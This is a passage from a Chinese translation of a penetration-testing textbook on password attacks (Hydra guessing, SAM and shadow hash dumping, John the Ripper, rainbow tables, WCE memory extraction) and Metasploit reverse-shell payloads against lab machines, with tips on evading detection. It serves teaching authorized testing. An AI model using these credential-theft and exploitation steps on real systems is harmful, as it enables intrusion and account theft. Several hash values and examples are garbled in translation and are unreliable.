  \ 9-5 展示了使用 `Hydra` 进行在线密码破解的示例。\n\n### 示例 9-5. 使用 Hydra 猜解 POP3 用户名和密码\n\n```\n\
  root@kali:~# hydra -L userlist.txt -P passwordfile.txt 192.168.20.10 pop3\nHydra\
  \ v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only\n\n\
  Hydra (http://www.thc.org/thc-hydra) starting at 2015-01-12 15:29:26\n[DATA] 16\
  \ tasks, 1 server, 24 login tries (l:4/p:6), ~1 try per task\n[DATA] attacking service\
  \ pop3 on port 110\n[110][pop3] host: 192.168.20.10   login: georgia   password:\
  \ password❶\n[STATUS] attack finished for 192.168.20.10 (waiting for children to\
  \ finish)\n1 of 1 target successfuly completed, 1 valid password found\nHydra (http://www.thc.org/thc-hydra)\
  \ finished at 2015-01-12 15:29:48\n```\n\n示例 9-5 展示了如何使用 `Hydra` 通过运行我们的用户名和密码文件，在我们的\
  \ Windows XP 目标上搜索有效的 POP3 凭据。该命令使用 `-L` 标志指定用户名文件，使用 `-P` 指定密码列表文件，并指定协议 `pop3`。`Hydra`\
  \ 发现用户 `georgia` 的密码在 ❶ 处是 `password`。（真该 `georgia` 使用了如此不安全的密码！）\n\n有时你知道服务器上存在某个特定的用户名，只需要一个对应的有效密码。例如，我们在第\
  \ 6 章 中使用了 `SMTP VRFY` 动词在 Windows XP 目标上的 SLMail 服务器上查找有效用户名。如示例 9-6 所示，我们可以使用\
  \ `-l` 标志代替 `-L` 来指定一个特定的用户名。既然知道了这一点，让我们在 `pop3` 服务器上为用户 `georgia` 寻找一个有效的密码吧。\n\
  \n### 示例 9-6. 使用 Hydra 使用特定用户名\n\n```\nroot@kali:~# hydra -l georgia -P passwordfile.txt\
  \ 192.168.20.10 pop3\nHydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for\
  \ legal purposes only\n[DATA] 16 tasks, 1 server, 24 login tries (l:4/p:6), ~1 try\
  \ per task\n[DATA] attacking service pop3 on port 110\n[110][pop3] host: 192.168.20.10\
  \   login: georgia   password: password❶\n[STATUS] attack finished for 192.168.20.10\
  \ (waiting for children to finish)\n1 of 1 target successfuly completed, 1 valid\
  \ password found\nHydra (http://www.thc.org/thc-hydra) finished at 2015-01-07 20:22:23\n\
  ```\n\n`Hydra` 发现 `georgia` 的密码是 `password` ❶。\n\n现在，在示例 9-7 中，我们将使用凭据来读取 `georgia`\
  \ 的邮件。### 示例 9-7. 使用 Netcat 使用猜出的凭据登录\n\n```\nroot@kali:~# nc 192.168.20.10 pop3\n\
  +OK POP3 server xpvictim.com ready <00037230589@xpvictim.com>\nUSER georgia\n+OK\
  \ georgia welcome here\nPASS password\n+OK mailbox for georgia has 0 messages（指定协议，并在提示时提供用户名和密码。）`Hydra`\
  \ 可以对范围进行在线密码破解。（参见其手册页。）例如，这里我们使用 `Hydra` 找到凭据通过 `nc` 登录。\n\n记住，大多数服务可以在一定次数登录尝试后锁定账户。引起客户\
  \ IT 人员注意最好的办法过于突然锁定多个账户。连续登录也会触发防火墙和入侵防御系统，导致你的 IP 地址被封。减慢速度和随机化扫描可以帮助解决这个问题，但当然，也有权衡：较慢的扫描需要更长时间。\n\
  \n避免登录尝试被发现的一种方法是在尝试登录之前猜解密码，你将在下一节中学习。\n\n## 离线密码攻击\n\n另一种破解密码（而不被发现）的方法是获取密码哈值的副本并尝试将其还原为明文密码。这说起来做起来难，因为哈希被设计为单向函数的结果：给定输入，可以使用哈希函数计算输出；但给定输出，无法轻易逆推。\n\
  \n正如你在 LM vs NTLM 中学的，`LM` 算法非常脆弱，因为它只存储密码的前 7 个字符且不区分大小。`NTLM` 算法强得多，但仍然受到各种攻击。\n\
  \n在本节中，我们将关注 `NTLM` 哈希。你可以使用 `hashdump` 命令找到 `NTLM` 哈希，如示例 9-8 所示。\n\n### 示例 9-8.\
  \ 在 Meterpreter 中导出密码哈希\n\n```\nmeterpreter > hashdump\nAdministrator:500:e52cac674199a224a3b108f3fa6cb6d:8846f7ea8fb117ad06bdd83b7586c\n\
  Guest:501:...\ngeorgia:1003:e52cac674199a224a3b108f3fa6cb6d:8846f7ea8fb117ad06bdd83b7586c\n\
  ```\n\n将 `hashdump` 的输出保存到名为 `xphashes.txt` 的文件中，我们将在 John the Ripper 中它。\n\n\n\n\
  \n\n在第 8 章中，我们还利用 Windows XP 系统上 `Zervit 0.4` 的本地文件包含漏洞下载了 `SAM` 和 `SYSTEM` 注册表配置备份。我们使用同一个漏洞下载了\
  \ `FileZilla` FTP 服务器的配置文件，其中包含使用 MD5 算法哈希的密码。在 Linux 目标上，`Vsftpd` 的笑脸后门给了我们 root\
  \ 权限，因此我们可以访问存储 Linux 密码哈希的 `/etc/shadow` 文件。我们将用户 `georgia` 的密码保存到文件 `linuxpasswords.txt`\
  \ 中。\n\n### 从 Windows SAM 文件中恢复密码哈希\n\n`SAM` 文件存储了经过哈希处理的 Windows 密码。虽然我们能够使用 `Meterpreter`\
  \ 从 Windows XP 系统转储密码哈希（如前所示），但有时你可能只能获得 `SAM` 文件。\n\n我们无法通过 `Zervit 0.4` 漏洞获取主\
  \ `SAM` 文件，但能够利用本地文件包含漏洞从 `C:\\Windows\\repair` 目录下载备份副本。但是当我们尝试读取 `SAM` 文件时（如示例\
  \ 9-9 所示），我们并没有看到任何密码哈希。\n\n示例 9-9. 查看 SAM 文件\n\n```\nroot@bt:~# cat sam\nregf \
  \    P P5gfhbinDDDDnk,DuDDDDD DDDD DDDDDDDDDxDDDDSAMXDDDsk x D DpDμ\\μ?\n?   μ μ\n\
  \                                  DDDDnk LDDDD DBDDDD Dx DDDDDSAMDDDDskxx7d\nDHXμ4μ?\
  \          DDDDvk D CPDDD D  μDxDμD0Dμ    DμDD 4μ1   ?         DDDDD\nDDDDlf   SAMDDDDnk\
  \ DuDDDDD   H#DDDD Px DDDDDomainsDDDDvkDDDDD8lf DDomaDDDDnk\n\\DDJDDD DDDDDD0x DDDD(\
  \ AccountDDDDvk DD\n--snip--\n```\n\n`SAM` 文件经过了混淆，因为 Windows 的 `Syskey` 工具使用 128\
  \ 位里斯特密码 4 (RC4) 对 `SAM` 文件内部的密码哈希进行加密以提供额外的安全性。即使攻击者或渗透人员获得了 `SAM` 文件，在恢复密码哈希之前还需要做一些工作。具体来说，我们需要一个密钥来反转加密的哈希。\n\
  \n`Syskey` 工具的加密密钥称为 `bootkey`，它存储在 Windows 的 `SYSTEM` 文件中。你会在发现备份 `SAM` 文件的 `C:\\\
  Windows\\repair` 目录下找到 `SYSTEM` 文件的副本。我们可以使用 Kali 中名为 `Bkhive` 的工具从 `SYSTEM` 文件中提取\
  \ `Syskey` 工具的 `bootkey`，这样我们就可以解密哈希，如示例 9-10 所示。\n\n示例 9-10. 使用 Bkhive 提取 bootkey\n\
  \n```\nroot@kali:~# bkhive system xpkey.txt\nbkhive 1.1.1 by Objectif Securite\n\
  http://www.objectif-securite.ch\noriginal author: ncuomo@studenti.unina.it\n\nRoot\
  \ Key : $$$PROTO.HIV\nDefault ControlSet: 001\nBootkey: 015777ab072930b22020b999557f42d5\n\
  ```\n\n在这里，我们使用 `Bkhive` 通过传入 `SYSTEM` 文件 `system`（我们通过 `Zervit 0.4` 目录遍历漏洞从修复目录下载的文件）作为第一个参数，并将文件提取到\
  \ `xpkey.txt` 来提取 `bootkey`。一旦我们有了 `bootkey`，就可以使用 `Samdump2` 从 `SAM` 文件中检索密码哈希，如示例\
  \ 9-11 所示。向 `Samdump2` 传递 `SAM` 文件的位置和来自 `Bkhive` 的 `bootkey` 作为参数，它将使用 `bootkey`\
  \ 解密哈希。\n\n示例 9-11. 使用 Samdump2 恢复 Windows 哈希\n\n```\nroot@kali:~# samdump2 sam\
  \ xpkey.txt\nsamdump2 1.1.1 by Objectif Securite\nhttp://www.objectif-securite.ch\n\
  original author: ncuomo@studenti.unina.it\n\nRoot Key : SAM\nAdministrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::\n\
  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n\
  HelpAssistant:1000:df40c521ef762bb7b9767e30ff112a3c:938ce7d211ea733373bcfc3e6fbb3641:::\n\
  SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:bc48640a0fcb55c6ba1c9955080a52a8:::\n\
  ```\n\n现在将这些哈希与在示例 9-8 的活动 `Meterpreter` 会话中使用 `hashdump` 命令找到的哈希进行对比。（具有足够权限的 `Meterpreter`\
  \ 会话可以直接转储密码哈希，不需要我们下载 `SAM` 和 `SYSTEM` 文件）。注意，我们在示例 9-11 中的哈希列表缺少了 `system` 条目。\n\
  \n### 通过物理访问转储密码哈希\n\n在某些任务中，你实际上可以直接接触机器。虽然物理访问初看起来可能并不有用，但让我们转储它的哈希吧。首先，我们将虚拟机的光驱器指向\
  \ Kali ISO，如图 9-1 所示（针对 VMware）。在 VMware Player 中，高亮你的 Windows 7 虚拟机，右键点击它并选择**设置**，然后选择**CD/DVD\
  \ (SATA)**，并在页面右侧的**使用 ISO 镜像**字段中指向该 ISO 文件。\n\n默认情况下，VMware 启动虚拟机的速度非常快，因此很难更改\
  \ BIOS 设置从 CD/DVD 驱动器而不是硬盘启动。为了修复这个问题，我们会在 VMware 配置文件（`.vmx`）中添加一行，使启动过程在 BIOS\
  \ 界面延迟几秒钟。\n\n1.  在宿主机上，浏览到保存虚拟机的地方。然后，在 Windows 7 目标文件夹中，找到 `*.vmx` 配置文件并用文本编辑器打开它。该配置文件看起来类似于示例\
  \ 9-12\")。\n\n示例 9-12. VMware 配置文件 (.vmx)\n\n```\n.encoding = \"UTF-8\"\nconfig.version\
  \ = \"8\"\nvirtualHW.version = \"9\"\nvcpu.hotadd = \"TRUE\"\nscsi0.present = \"\
  TRUE\"\nscsi0.virtualDev = \"lsilogic\"\n--snip--\n```\n\n\n\n\n2. 在文件的任何位置添加 `bios.bootdelay\
  \ = 3000` 行。这会告诉虚拟机延迟启动 3000 毫秒（即三秒），这段时间足够我们更改启动选项了。\n\n3. 保存 `*.vmx` 文件并重启 Windows\
  \ 7 目标机器。一旦能够进入 BIOS，选择从光驱驱动器启动。虚拟机应该启动 Kali ISO。尽管我们进入了 Kali，但我们仍然挂载 Windows 硬盘并访问文件，从而绕过\
  \ Windows 操作系统的安全特性。\n\n示例 9-13 显示了如何挂载文件系统并转储密码哈希。\n\n示例 9-13. 使用 Linux Live CD\
  \ 倾储 Windows 哈希\n\n```\nroot@kali:# ❶mkdir -p /mnt/sda1\nroot@kali:# ❷mount /dev/sda1\
  \ /mnt/sda1\nroot@kali:# ❸cd /mnt/sda1/Windows/System32/config/\nroot@kali:/mnt/sda1/Windows/System32/config\
  \  bkhive SYSTEM out\nroot@kali:/mnt/sda1/Windows/System32/config  samdump2 SAM\
  \ out\nsamdump2 1.1.1 by Objectif Securite\nhttp://www.objectif-securite.ch\noriginal\
  \ author: ncuomo@studenti.unina.it\n\nRoot Key : CMI-CreateHive{899121E8-11D8-41B6-ACEB-301713D5ED8C}\n\
  Administrator:500:aad3b435b51404eeaad3b43b5140ee:31dcfe0d16ae93b73c597e0c\nGuest:501:aad3b435b51404eeaad3b43b5140ee:31dcfe0d16ae93b73c597e0c\n\
  Georgia Weidman:1000:aad3b435b51404eeaad3b43b5140ee:8846f7ea8fb17ad06bdd83b75c\n\
  ```\n\n我们在 ❶ 处使用 `mkdir` 命令创建了一个用于挂载 Windows 文件系统的目录。接下来，我们使用 `mount` ❷ 将 Windows\
  \ 文件系统（`/dev/sda1`）挂载到新创建的 `/mnt/sda1` 中，这意味着目标机的 C 盘实际上位于 `/mnt/sda1`。Windows 中的\
  \ `SAM` 和 `SYSTEM` 文件位于 `C:\\Windows\\System32\\config`，因此我们使用 `cd` ❸ 切换目录到 `/mnt/sda1/Windows/System32/config`\
  \ 以访问这些文件。此时，我们无需先将 `SAM` 和 `SYSTEM` 文件保存并移动到 Kali，就可以直接使用 `Samdump2` 和 `Bkhive`\
  \ 处理。\n\n我们再次成功获取了密码哈希。现在我们我们拥有 Windows XP 目标、Windows 7 目标、Linux 目标以及 Windows XP\
  \ 目标上的 FileZilla FTP 服务器的哈希。\n\n### 注意\n\n在第 13 章中，我们将探索一些使用密码哈希进行验证而无需明文密码的技巧，但通常情况下为了使用这些哈希，我们需要反转加密哈希并获取明文密码。这的难度取决于所使用的密码哈希算法以及密码的强度。\n\
  \n### LM 与 NTLM 哈希算法\n\n示例 9-14 对比了这两个密码哈希条目。第一个属于 Windows XP 上的 `Administrator`\
  \ 账户，我们在 Meterpreter 中通过 `hashdump` 找到它；第二个是 Windows 7 上的 Georgia Weidman 账户，我们在上一节通过物理访问找到它。\n\
  \n示例 9-14. 使用 Linux Live CD 倾储 Windows 哈希\n\n```\nAdministrator:500:e52cac67419a9224a3b108f3fa6cbd:8846f7ea8fb117ad6bdd83b75c\n\
  Georgia Weidman:1000:aad3b435b51404eeaad3b43b5140ee:8846f7ea8fb11ad06bdd83b75c\n\
  ```\n\n哈希中的第一个字段是用户名 ❶；第二个是用户 ID ❷；第三个是 LAN Manager (LM) 格式的密码哈希 ❸；第四个是 NT LAN Manager\
  \ (NTLM) 哈希 ❹。`LM Hash` 曾是 Windows NT 之前微软 Windows 哈希密码的主要方法，但它在密码学上是不健全的，这使得无论密码长度和复杂度如何，都可能发现\
  \ `LM hash` 的正确明文密码。微软引入了 NTLM 哈希来取代 `LM hash`，但在 Windows XP 上，密码默认同时以 `LM` 和 `NTLM`\
  \ 格式存储。（Windows 7 则完全选择了更安全的 `NTLM hash`。）\n\n在[示例 9-14]所示的哈希中，由于两个密码都是字符串 `password`，每个账户的\
  \ `NTLM hash` 条目是相同的，但 `LM hash` 字段是不同的。第一个条目的值为 `e52cac67419a9224a3b108f3fa6cbd`，而\
  \ Windows 7 的条目为 `aad3b435b51404eeaad3b43b5140ee`，这在 `LM hash` 语言中表示为空。包含 `LM hash`\
  \ 条目会让哈希破解变得简单得多。事实上，任何 `LM-hashed` 密码都可以在几分钟到几小时内被破解。相比之下，我们破解 `NTLM hashes` 的能力取决于猜测能力以及密码的长度和复杂度。如果哈希函数在密码学上是健全的，尝试每一个可能的密码可能需要几年、十年甚至超过一生。\n\
  \n### LM 密码哈希的问题\n\n当你在渗透测试中看到 `LM hashes` 时，可以确定从密码哈希中恢复明文密码。然而，单向哈希函数是不可逆的。复杂的数学被用于开发算法，使得在已知密码哈希的情况下，无法发现被哈希的原始明文密码值。但我们*可以*将明文密码猜测通过哈希函数，并将其结果与我们尝试破解的哈希进行比较；如果它们相同，我们就找到了密码。\n\
  \n以下问题导致了 `LM hashes` 的不安全性：\n\n- 密码被截断为 14 个字符。\n- 密码被转换为全大写。\n- 少于 14 个字符的密码会用零填充到\
  \ 14 个字符。\n- 14 个字符的密码被分成两个七字符的密码。\n\n为什么这些特征如此重要？假设我们从一个这样一个复杂的强密码开始：\n\n```\n\
  T3LF23!?sty$J\n```\n\n这个密码包含 15 个字符，涵盖四类字符（包括小写字母、大写字母、数字和符号），且不是基于字典单词。但在 `LM 哈希算法`\
  \ 中，密码会被截断为 14 个字符，如下：\n\n```\nT3LF23!?sty$\n```\n\n然后小写字母被改为大写字母：\n\n```\nT3LF23!?SRTY$\n\
  ```\n\n接下来，密码被分成两个七字符的部分。这两个部分随后被用作密钥使用数据加密标准 (DES) 加密算法对静态字符串 `KGS!@#$%` 进行加密：\n\
  \n```\nT3LF23!     SRTY$\n```\n\n加密产生的八字节密文随后被拼接在一起形成 `LM hash`。\n\n### John the\
  \ Ripper\n\n用于破解密码的流行工具之一是 John the Ripper。John the Ripper 的默认模式是暴力破解。由于 `LM hash`\
  \ 中可能的明文密码集非常有限，因此暴力破解是在合理时间内破解任何 `LM hash` 的可行方法，即使是在我们这个 CPU 性能和内存有限的 Kali 虚拟机上也是如此。\n\
  \n例如，如果我们在本章早些时候收集的 Windows XP 哈希保存到名为 *xphashes.txt* 的文件中，然后像这样将它们喂给 John the Ripper，我们会发现\
  \ John the Ripper 可以遍历整个可能的密码集并得出正确答案，如示例 9-15 所示。\n\n\n\n\n```\nroot@kali: john\
  \ xphashes.txt\nWarning: detected hash type \"lm\", but the string is also recognized\
  \ as \"nt\"\nUse the \"--format=nt\" option to force loading these as that type\
  \ instead\nLoaded 10 password hashes with no different salts (LM DES [128/128 BS\
  \ SSE2])\n                 (SUPPORT_388945a0)\nPASSWOR          (secret:1)\n   \
  \              (Guest)\nPASSWOR          (georgia:1)\nPASSWOR          (Administrator:1)\n\
  D                (georgia:2)\nD                (Administrator:2)\nD123         \
  \    (secret:2)\n```\n\nJohn the Ripper 破解了七字符密码哈希。在示例 9-15 中，我们看到 `PASSWOR` 是用户\
  \ `secret` 密码的前半部分。同样，它也是 `georgia` 和 `Administrator` 密码的前半部分。`secret` 密码的后半部分是\
  \ `D123`，而 `georgia` 和 `Administrator` 的后半部分是 `D`。因此，LM 哈希化密码的完整明文对于 `georgia` 和\
  \ `Administrator` 是 `PASSWORD`，对于 `secret` 是 `PASSWORD123`。LM 哈希并不告诉我们密码正确的大小写，如果你尝试用密码\
  \ `PASSWORD` 以 `Administrator` 或 `georgia` 登录 Windows XP 机器，或者用密码 `PASSWORD123`\
  \ 账户 `secret`，你将得到登录错误，因为 LM 哈希没有考虑密码中字母正确的大小写。\n\n要找到密码正确的大小写，我们需要查看 NTLM 哈希的第四个字段。John\
  \ the Ripper 在示例 9-15 的示例中提到也存在 NTLM 哈希，你可以使用 `--format=nt` 标志强制 John the Ripper\
  \ 使用这些哈希（我们没有 Windows 7 的 LM 哈希，因此我们必须使用字典列表来破解 Windows 7 密码，因为暴力破解 NTLM 哈希可能需要太长时间）。\n\
  \n破解 Windows NTLM 哈希远没有像破解 LM 哈希那么简单。虽然仅使用小写字母且没有其他复杂性的五字符 NTLM 密码可以像 LM 哈希一样被快速暴力破解，但一个具有大量复杂性的\
  \ 30 字符 NTLM 密码可能需要多年才能破解。尝试任何长度的各种可能的字符组合、对其进行哈希并与某个值进行比较可能会一直持续，直到我们偶然发现正确的值（结果发现用户自此后更改了密码）。\n\
  \n与其尝试暴力破解密码，我们可以使用包含已知密码、常用密码、字典单词、在末尾填充数字和符号的字典单词组合等内容的字典列表。（我们将在破解 Linux 密码中看到使用\
  \ John the Ripper 使用字典列表的示例）。\n\n## 真实世界示例\n\n旧的密码哈希曾在我的一一次渗透测试中起过决定性作用。当时的域控制器是\
  \ Windows Server 2008，具有很强的安全态势。整个企业的工作站也相当安全，最近升级到了完全了补丁的 Windows 7 系统。然而，黑暗中有一线曙光：一台缺少几个安全补丁的\
  \ Windows 2000 机器。我能够使用 Metasploit 快速获取该机器的系统权限。\n\n问题在于，虽然从纸面上看，渗透测试现在成功了，但攻破这台机器几乎一无所获。系统不包含敏感文件，而且它是该特定网络上的唯一机器，与新的、已更新的\
  \ Windows 域隔离。它具有所有域控制器的特征，除了没有客户端。环境中的所有其他机器都是新 Windows 2008 域控制器的域成员。尽管从技术上讲我现在是域管理员，但在渗透测试方面，我并没有比发现\
  \ Windows 2000 机器之前有任何进展。\n\n由于这是域控制器，域用户密码哈希包含在本地。Windows 2000 像 Windows XP 一样存储密码的\
  \ LM 哈希。客户端旧的域管理员密码很强；大约有 14 个字符；包含大写字母、小写字母、数字和符号；并且不是基于字典单词。幸运的是，因为它是 LM 哈希的，我能够在几分钟内找回密码。\n\
  \n你认为新域的域管理员密码是什么？你猜对了。它和旧域的域管理员密码是一样的。那台 Windows 2000 机器已经六多月没有使用了，但它仍在运行，并且使用了一种不安全的哈希算法。此外，客户没有定期更改密码。这两点的结合导致了原本很强的安全态势崩溃。我只需用在被攻的\
  \ Windows 2000 系统上找到域管理员密码登录，即可访问环境中的每个系统。\n\n### 破解 Linux 密码\n\n我们也可以用 John the\
  \ Ripper 处理我们在第 8 章利用 Vsftpd 服务器后门后导出的 Linux 密码哈希，如示例 9-16 所示。\n\n### 示例 9-16. 使用\
  \ John the Ripper 破解 Linux 哈希\n\n```\nroot@kali# cat linuxpasswords.txt\ngeorgia:$1$CNp3mty6$lRWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::\n\
  root@kali# johnlinuxpasswords.txt --wordlist=passwordfile.txt\nLoaded 1 password\
  \ hash (FreeBSD MD5 [128/128 SSE2 intrinsics 4x])\npassword         (georgia)\n\
  guesses: 1  time: 0:00:00:00 DONE (Sun Jan 11 05:05:31 2015)  c/s: 100\ntrying:\
  \ password - Password123\n```\n\n用户 `georgia` 有一个 MD5 哈希（我们可以从密码哈希开头的 `$1$` 看出）。MD5\
  \ 无法在合理的时间内暴力破解。相反，我们在 John the Ripper 中配合 `--wordlist` 选项使用字典列表。John the Ripper\
  \ 破解密码的成功取决于字典列表中是否包含正确的密码。\n\n#### 使用 John the Ripper 混淆字典列表\n\n当密码策略要求密码中包含数字和/或符号时，许多用户只会将它们添加到字典单词的末尾。使用\
  \ John the Ripper 的规则功能，我们可以捕获这种以及可能逃过简单字典列表的其他常见变。用编辑器打开 `/etc/john/john.conf`\
  \ 中的 John the Ripper 配置文件并搜索 `List.Rules:Wordlist`。在该标题下，你可以为字典列表添加混淆规则。例如，规则 `$[0-9]$[0-9]$[0-9]`\
  \ 将在字典列表中的每个单词末尾添加三个数字。你可以通过命令行使用 `--rules` 标志来启用 John the Ripper 中的规则。关于编写自定义规则的更多信息可以在\
  \ `http://www.openwall.com/john/doc/RULES.shtml` 找到。\n\n### 破解配置文件密码\n\n最后，让我们尝试破解通过\
  \ Zervit 0.4 文件包含漏洞下载的 FileZilla FTP 服务器配置文件中发现的 MD5 哈希密码。正如你所看到的，有时我们甚至不需要破解密码哈希。例如，尝试在搜索引擎中输入用户\
  \ `georgia` 的哈希 `5f4dcc3b5aa765d61d8327deb882cf99`。前几个搜索结果证实了 `georgia` 的密码是 `password`。此外，搜索还告诉我们，当安装\
  \ FileZilla FTP 服务器并使用密码 `wampp` 时，会创建账户 `newuser`。\n\n\n\n\n现在尝试使用这些凭据登录 Windows\
  \ XP 目标的 FTP 服务器。果不其然，登录成功了。该系统的管理员忘记更改内置 FTP 账户的默认密码。如果我们不能这么容易地恢复明文密码，我们可以像之前讨论过的那样，再次使用\
  \ `John the Ripper` 配合词表。\n\n### 彩虹表\n\n与其取词表并使用相关算法对每个条目进行哈希，然后将生成的哈希值与要破解的值进行比较，不如通过对词表进行预哈希来大大加速这一过程。这无疑会占用存储空间——哈希列表越长，空间越大，而当我们尝试存储所有可能的密码哈希值以暴力破解时，空间将趋于无限。\n\
  \n一组预计算的哈希值被称为 `rainbow table`（彩虹表）。彩虹表通常包含特定算法特定长度和有限字符集范围内的所有可能的哈希项。例如，你可能有一个针对\
  \ `MD5` 哈希的彩虹表，其中包含所有长度在 1 到 9 位之间的小写字母和数字。该表的大小约为 80 GB——以目前的存储价格来说并不糟糕，但请记住，这只是\
  \ MD5 可能密钥空间中非常有限的一部分。\n\n考虑到其有限的密钥空间（之前讨论过），`LM hash` 似乎是使用彩虹表的理想选择。一组完整的 `LM hash`\
  \ 彩虹表大小约为 32 GB。\n\n你可以从 [`project-rainbowcrack.com/table.htm`](http://project-rainbowcrack.com/table.htm)\
  \ 下载预生成的哈希集。Kali 中的 `Rcrack` 工具可以用于在彩虹表中筛选出正确的明文。\n\n### 在线密码破解服务\n\n当前 IT 领域最流行的热门趋势是将一切迁移到云端，密码破解也不例外。通过利用多台高配置机器，你可以获得比仅在笔记本电脑上运行虚拟机更快、更全面的结果。当然，你可以在云端建立自己的高功率机器，创建自己的词表等，但也有在线服务可以付费为你处理这些工作。例如，[`www.cloudcracker.com/`](https://www.cloudcracker.com/)\
  \ 可以破解 `NTLM` Windows 哈希、Linux 的 `SHA-512`、无线网络的 `WPA2` 握手包等。你只需上传密码哈希文件，破解器就会完成剩下的工作。\n\
  \n## 使用 Windows Credential Editor 从内存中导出明文密码\n\n既然我们可以获取明文密码，为什么还要去破解密码哈希呢？如果我们拥有\
  \ Windows 系统的权限，在某些情况下我们可以直接从内存中提取明文密码。具有这种功能的工具是 Windows Credential Editor (`WCE`)。我们可以将此工具上传到受攻击的目标系统，它将从负责执行系统安全策略的`本地安全权威子系统服务`\
  \ (`LSASS`) 进程中提取明文密码。你可以从 [`www.ampliasecurity.com/research/wcefaq.html`](http://www.ampliasecurity.com/research/wcefaq.html)\
  \ 下载最新版本的 `WCE`。示例 9-17 显示了运行 `WCE` 的实例。\n\n### 示例 9-17 运行 WCE\n\n```\nC:\\>wce.exe\
  \ -w\nwce.exe -w\nWCE v1.42beta (Windows Credentials Editor) - (c) 2010-2013 Amplia\
  \ Security - by Hernan Ochoa\n(hernan@ampliasecurity.com)\nUse -h for help.\n\n\
  georgia\\BOOKXP:password\n```\n\n在这里，`WCE` 找到了用户 `georgia` 密码的明文。这种攻击的缺点是需要一个登录的用户，密码才会存储在内存中。即使你通过这种方法获取了一两个明文密码，仍然值得导出并尝试破解你所访问的任何密码哈希。\n\
  \n## 总结\n\n逆向密码哈希是一个兴奋的领域，随着硬件速度的提高，更快破解更强的哈希成为可能。通过使用多个 CPU 甚至显卡上的图形处理器 (`GPUs`)，密码破解器可以非常地尝试许多哈希。我们的虚拟机没有多少处理能力，但即使是普通的现代笔记本电脑也比几年前用于密码破解的机器快得多。如今密码破解的前沿是转向云端，利用多台顶级云服务器进行破解。你甚至会发现一些基于云的密码破解服务。\n\
  \n正如在本章看到的，利用第 8 章从成功漏洞中收集的信息，我们成功逆向了密码哈希，恢复了某些服务以及系统本身的明文密码。既然已经在系统中建立了立脚点，让我们看看如果在监听网络时没有发现漏洞，哪些高级攻击方法可以帮助我们。毕竟，我们还有一台\
  \ Windows 7 机器要利用。\n\n## 第 10 章 客户端攻击\n\n我们到目前为止研究的漏洞都是“手可唾到的果实”，而且在实际项目中都出现过。在渗透测试中，发现监听端口的有漏洞服务、未更改的默认密码、配置错误的\
  \ Web 服务器等是非常常见的。\n\n然而，投入大量精力和维护安全态的客户可能免于此类漏洞。他们可能安装了所有的安全补丁；他们可能会定期审核密码并删除任何容易被猜到或破解的密码。他们可能控制用户角色：普通用户在工作站上可能没有管理员权限，安装的任何软件都会由安全人员进行调查和维护。结果，可能没有足够的服务可以尝试攻击。\n\
  \n尽管如此，尽管部署了最新最强大的安全技术并聘请了破解安全团队，知名公司（对攻击者可能有丰厚回报）仍然被攻破。在本章中，我们将检查几种不需要直接网络访问的攻击。我们将研究针对系统本地软件的攻击——即那些没有监听端口的软件。\n\
  \n由于我们不会直接攻击计算机或监听端口，而且我们需要找到另一种攻击企业边界内部设备的方法，因此我们需要相应地选择我们的有效荷（payload）。虽然普通的绑定\
  \ shell（bind shell）对于直接暴露在互联网或在本地网络监听端口的系统可能运行良好，但在这里我们至少限于反向连接（reverse connections）。\n\
  \n但在之前，让我们深入研究 Metasploit 有效荷系统，并查看对你可能一些其他有效荷。\n\n### 使用 Metasploit 有效荷绕过过滤器\n\n\
  在之前的章节中，我们讨论了 Metasploit 有效荷系统，包括单阶段与分阶段（single vs. staged）有效荷，以及绑定 shell 与反向 shell（reverse\
  \ shells）。我们还简要提到了 Metasploit 的 `Meterpreter` 有效荷（我们将在第 13 章深入讨论）。当你在模块上使用 `show\
  \ payloads` 命令时，可能会看到几个对你来说是新的有效荷。我们将在本节查看几个可以用于绕过渗透测试中可能遇到的过滤技术的有效荷。\n\n### 所有端口\n\
  \n我们的网络设置使得我们的攻击虚拟机和目标虚拟机位于同一网络，且没有防火墙或其他过滤器拦截通信。但在你的渗透测试生涯中，你可能会遇到具有各种过滤设置的客户。即使是反向连接也可能无法通过过滤器并连接到你攻击机器上的任何端口。例如，客户网络可能不允许流量通过端口\
  \ 4444 离开网络，这是 Metasploit `reverse_tcp` 有效荷的默认端口。它可能仅允许流量通过特定端口，例如用于 Web 流量的 80\
  \ 或 443 端口。\n\n\n\n\n如果我们知道哪些端口允许通过过滤器，就可以将 `LPORT` 选项设置为相应的端口。Metasploit 的 `reverse_tcp_allports`\
  \ 负载可以帮助我们找到一个可以连接的端口。正如名称所示，这种负载通信方法将尝试所有端口，直到找到连接到 Metasploit 的成功连接。\n\n让我们用 `windows/shell/reverse_tcp_allports`\
  \ 负载来测试此功能，如示例 10-1 所示。我们正在针对 Windows XP 使用 `MS08-067` 漏洞。\n\n#### 示例 10-1. Windows/shell/reverse_tcp_allports\
  \ 负载\n\n```\nmsf  exploit(ms08_067_netapi) > set payload windows/shell/reverse_tcp_allports\n\
  payload => windows/shell/reverse_tcp_allports\nmsf  exploit(ms08_067_netapi) > show\
  \ options\n--snip--\nPayload options (windows/shell/reverse_tcp_allports):\n\n \
  \  Name      Current Setting  Required  Description\n   ----      ---------------\
  \  --------  -----------\n   EXITFUNC  thread           yes       Exit technique:\
  \ seh, thread, process, none\n   LHOST     192.168.20.9     yes       The listen\
  \ address\n  ❶LPORT     1                yes       The starting port number to connect\
  \ back on\n--snip--\nmsf  exploit(ms08_067_netapi) > exploit\n\n[*] Started reverse\
  \ handler on 192.168.20.9:1\n--snip--\n[*] Sending encoded stage (267 bytes) to\
  \ 192.168.20.10\n[*] Command shell session 5 opened (192.168.20.9:1 -> 192.168.20.10:1100)\
  \ at 2015-05-14\n22:13:20 -0400 ❷\n```\n\n在这里，`LPORT` ❶ 选项指定了尝试的第一个端口。如果该端口无效，负载将尝试每个后续端口，直到连接成功。如果负载尝试到\
  \ 65535 都没有成功，它将从端口 1 开始重新尝试并无限运行。\n\n由于没有过滤器拦截我们的流量，Metasploit 尝试的第一个端口（端口 1）创建了成功连接，如\
